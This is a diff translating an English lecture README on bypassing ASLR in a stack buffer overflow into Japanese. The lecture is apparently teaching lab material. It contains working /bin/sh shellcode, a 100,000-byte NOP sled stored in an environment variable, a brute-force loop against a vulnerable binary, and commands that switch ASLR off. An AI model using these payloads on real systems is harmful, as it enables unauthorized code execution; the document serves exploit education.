@@ -1,26 +1,24 @@
-# Shellcode injection with ASLR
+# ASLR 下でのシェルコード注入
 
-In the previous [Lecture](../Lecture2/README.md) I talked about, injection of
-shell code when the ASLR was disabled. ASLR allows randomization of
-different segment address. So it's not very trivial to identify the buffer address. The address of buffer keep on changing with every run of the program. So when the return address points to the buffer address (that keeps on changing), putting the executable shell code in memory is not so easy.
+前の[講義](../Lecture2/README.md)では、ASLR が無効なときのシェルコードの注入を扱いました。ASLR は、各セグメントのアドレスをランダム化します。そのため、バッファのアドレスを特定するのは簡単ではありません。バッファのアドレスは、プログラムを実行するたびに変わり続けます。したがって、戻りアドレスが(変わり続ける)バッファのアドレスを指すようにして、実行可能なシェルコードをメモリに置くのは、それほど簡単ではありません。
 
-To disable ALSR,
+ASLR を無効にするには、
 `echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space`
-To enable the same,
+有効にするには、
 `echo "2" | sudo dd of=/proc/sys/kernel/randomize_va_space`
 
-#### Scenario 1: With `nop - \x90` sled.
-Suppose I appended few `nop` (no operation instruction) before the shellcode.
+#### シナリオ 1: `nop - \x90` sled を使う
+シェルコードの前に、いくつかの `nop`(何もしない命令)を付け足したとします。
 
 #### NOP
 > In computer science, a NOP, no-op, or NOOP (pronounced "no op"; short for no operation) is an assembly language instruction, programming language statement, or computer protocol command that does nothing.
 
-Lets say I added 20 `nop` before the shellcode.
+シェルコードの前に20個の `nop` を付け足したとします。
 `python -c 'import struct;shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; bufferlen=108; print "\x90"*20+shellcode+"\x90"*(bufferlen-len(shellcode)-20)+"BBBB"+struct.pack("<I", starting address of the buffer)'`
-And make return address point to any of the **21** locations, from the staerting address of the buffer to the starting address of the shellcode ( address of buffer + 20), then I will spawn the shell indeed. But **what is the probability?** That return address(which is nothing but buffer address) will end up in any of those locations. The higher the probability, higher are the chances for exploitation.
+そして、戻りアドレスが、バッファの開始アドレスからシェルコードの開始アドレス(バッファのアドレス + 20)までの **21** か所のどれかを指すようにすれば、確かにシェルを起動できます。しかし、**その確率はどれくらいでしょうか。** つまり、戻りアドレス(バッファのアドレスにほかなりません)が、それらの場所のどれかに収まる確率です。確率が高いほど、exploit が成功する可能性も高くなります。
 
-The starting address of buffer would be `0xff_ _ _ _ _ _ _` in which the first `0xff` is fixed, because the buffer will lie in the upper portion of memory.
-To test this, create a simple C program:
+バッファの開始アドレスは `0xff_ _ _ _ _ _ _` の形になります。バッファはメモリの上位の領域にあるので、先頭の `0xff` は固定です。
+これを試すために、単純な C プログラムを作ります。
 ```C
 int main()
 {
@@ -29,7 +27,7 @@ int main()
     return 0;
 }
 ```
-Compile and run this program for say 10 runs.
+このプログラムをコンパイルして、たとえば10回実行します。
 ```bash
 $ for i in {1..10};do ./a.out;done
 0xffe918bc
@@ -43,18 +41,18 @@ $ for i in {1..10};do ./a.out;done
 0xfffe386c
 0xff9547cc
 ```
-The observation is same what we have assumed. You can test the programs for more trials in case you are not convinced.
-It seems that every time the variable is loaded at different addresses in the stack. The address can be represented as 0xffXXXXXc(where X is any hexadecimal digit). With some more testing, it can be seen that even the last half-byte(‘c’ over here) depends on the relative location of the variable inside the program. So in general, the address of a variable on the stack is 0xffXXXXXX. This amounts to 16^6 = 16777216 possible cases. It can be easily seen that the earlier method, mentioned above to exploit the stack, will now work with only 21/16777216 probability(21 is the length of NOP slide, if any of those NOP bytes happens to be where the modified return address is, the shellcode will be executed).
-That means on an average, 1 in ~ 40K runs, the shellcode will be executed. This is way less. In any way we got he hint that somehow we need to increase the length of the `nop` sled on the buffer, but the buffer length is limited. Increasing the size of `nop` will increase the chances of shellcode to run. But How?
+観察の結果は、想定したとおりです。納得できなければ、さらに多くの回数で試してください。
+変数は、実行のたびにスタック上の異なるアドレスに読み込まれるようです。アドレスは 0xffXXXXXc(X は任意の16進数の桁)と表せます。さらに試すと、最後の半バイト(ここでは ‘c’)さえ、プログラム内での変数の相対的な位置に依存することがわかります。したがって一般に、スタック上の変数のアドレスは 0xffXXXXXX です。これは 16^6 = 16777216 通りになります。上で述べたスタックの exploit 方法が成功する確率は、21/16777216 しかないことがすぐにわかります(21 は NOP slide の長さで、書き換えた戻りアドレスがたまたまそれらの NOP バイトのどれかにあたれば、シェルコードが実行されます)。
+つまり平均すると、約4万回に1回しかシェルコードが実行されません。これではあまりにも少なすぎます。いずれにせよ、バッファ上の `nop` sled をどうにかして長くする必要があるというヒントは得られましたが、バッファの長さには限りがあります。`nop` を増やせば、シェルコードが実行される可能性は高まります。ではどうするのでしょうか。
 
-Why not take the help of **environment variable**?
+**環境変数** の助けを借りてはどうでしょうか。
 
-#### Scenario 2: Putting long shellcode in env variable
-In my vagrant system, I can make the environment variable way long the size of the buffer. My system allows the environment variable to be of length 100K. The reason we are picking the environment variable is that, they are itself loaded just above the stack.
-Lets create environment variable, say `SHELLCODE`.
+#### シナリオ 2: 長いシェルコードを環境変数に入れる
+私の vagrant のシステムでは、環境変数をバッファのサイズよりはるかに長くできます。私のシステムは、長さ100Kの環境変数を許可します。環境変数を選ぶ理由は、環境変数そのものがスタックのすぐ上に読み込まれるからです。
+たとえば `SHELLCODE` という環境変数を作ります。
 `export SHELLCODE=$(python -c 'print "\x90"*100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
 `
-And instead of putting the return address to starting address of the buffer, I will put the return address to any of the randomly picked higher memory address. Lets say any address in between highest address `0xffffffff` and `0xff9547cc`. I am picking `0xff882222`.
+そして、戻りアドレスをバッファの開始アドレスにする代わりに、ランダムに選んだ上位のメモリアドレスのどれかにします。たとえば、最上位のアドレス `0xffffffff` と `0xff9547cc` の間のどれかのアドレスです。ここでは `0xff882222` を選びます。
 
 `$ for i in {1..100}; do ./exploit_me_3 $(python -c 'import struct;print "A"*112 + struct.pack("<I", 0xff882222)'); done`
 
@@ -72,5 +70,5 @@ $whoami
 vagrant
 ```
 
-After few attempts, we got the shell. :cool: isn't it !!
+数回試すと、シェルが得られました。:cool: すごいでしょう!
 
